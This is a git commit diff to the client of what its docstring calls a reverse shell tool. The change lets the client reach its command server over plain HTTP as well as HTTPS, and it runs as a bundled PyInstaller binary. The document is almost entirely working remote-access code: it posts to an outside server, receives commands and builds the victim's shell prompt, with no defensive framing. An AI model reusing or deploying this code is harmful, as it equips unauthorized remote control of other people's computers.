4944844004547de9901c8239eb5aa515389afb8b
EONRaider <livewire_voodoo@protonmail.com>
2021-11-24 11:22:43 -0300

    Add support for HTTP connections
    The client was modified to connect to servers
    through HTTP. Additionally:
    
    - Implemented 'Client.ca_cert' getter and setter
    - Modified 'Client.server_url' getter
    - Modified 'Client.post' method to work with
    HTTP connections
    - Modified client execution from the main
    context to account for None as the value for a
    CA certificate when dealing with HTTP connections
    - Modified docstrings

--- src/client/client.py
+++ src/client/client.py
@@ -9,7 +9,8 @@ import platform
 import ssl
 import sys
 from pathlib import Path
-from urllib import request, parse
+from urllib.request import Request, urlopen
+from urllib import parse
 
 from src.client.commands import ClientCommands
 
@@ -18,31 +19,54 @@ class Client:
     def __init__(self,
                  server_address: str,
                  server_port: int, *,
-                 ca_cert: [str, Path]):
+                 ca_cert: [str, Path, None]):
         """Create a Reverse Shell Client that receives commands from a
-        server though HTTPS.
+        server though HTTP(S).
 
         :param server_address: Hostname or address of the server.
         :param server_port: Port number used by the server.
         :param ca_cert: Path to a file containing the certificate for
-            the Certificate Authority (CA) in PEM format.
+            the Certificate Authority (CA) in PEM format. Connects to
+            HTTP servers if set to None.
         """
         self.server_address = server_address
         self.server_port = server_port
         self._commands = ClientCommands(self)
-        self.ca_cert = Path(ca_cert)
-        self._ssl_context = ssl.create_default_context(
-            purpose=ssl.Purpose.SERVER_AUTH,
-            cafile=str(self.ca_cert)
-        )
+        self.ca_cert = ca_cert
+
+    @property
+    def ca_cert(self):
+        """Gets the path to the CA certificate.
+        Validates and sets the path to the CA certificate and
+        establishes the SSL context for HTTPS connections, if any."""
+        return self._ca_cert
+
+    @ca_cert.setter
+    def ca_cert(self, cert):
+        if cert is None:  # Run in HTTP mode
+            self._ssl_context = None
+        else:             # Run in HTTPS mode
+            try:
+                cert = Path(cert)
+            except TypeError:
+                raise SystemExit(f"Invalid name for CA file: {cert}")
+            if not cert.exists():
+                raise FileNotFoundError(f"Non-existent file for CA certificate:"
+                                        f" {cert}")
+            self._ssl_context = ssl.create_default_context(
+                purpose=ssl.Purpose.SERVER_AUTH,
+                cafile=str(cert)
+            )
+        self._ca_cert = cert
 
     @property
     def server_url(self) -> str:
-        return f"https://{self.server_address}:{self.server_port}"
+        url_scheme = "http" if self._ssl_context is None else "https"
+        return f"{url_scheme}://{self.server_address}:{self.server_port}"
 
     @property
     def _shell_prompt(self) -> str:
-        """Returns a string containing shell prompt information in the
+        """Gets a string containing shell prompt information in the
         format user@host:/path/to/cwd$"""
         return f"{getpass.getuser()}@{platform.node()}:{str(Path.cwd())}$ "
 
@@ -54,9 +78,11 @@ class Client:
         :return: A response to the POST request.
         """
         request_body: bytes = parse.urlencode(request_body).encode()
-        url = request.Request(self.server_url, data=request_body)
-        with request.urlopen(url=url, context=self._ssl_context) as r:
-            response = r.read().decode()
+        url = Request(self.server_url, data=request_body)
+        post_request = urlopen(url) if self._ssl_context is None else \
+            urlopen(url, context=self._ssl_context)
+        with post_request:
+            response = post_request.read().decode()
         return response
 
     def execute(self) -> None:
@@ -108,12 +134,16 @@ if __name__ == "__main__":
         '''Client is executed as a binary compiled by PyInstaller. All 
         configuration options are read from the 'config.py' file that 
         is created and bundled in the binary during the build process 
-        defined by 'build.py'. The CA certificate file is located by 
-        PyInstaller in the directory with path defined by sys._MEIPASS.
+        defined by 'build.py'. The CA certificate file, if existent, is 
+        located by PyInstaller in the directory with path defined by 
+        sys._MEIPASS.
         '''
         import importlib
         args = importlib.import_module("config")
-        args.ca_cert = Path(sys._MEIPASS).joinpath(args.ca_cert)
+        try:
+            args.ca_cert = Path(sys._MEIPASS).joinpath(args.ca_cert)
+        except AttributeError:
+            args.ca_cert = None
     else:
         '''Client is executed from source code by the system interpreter 
         for development purposes. All configuration options are parsed 
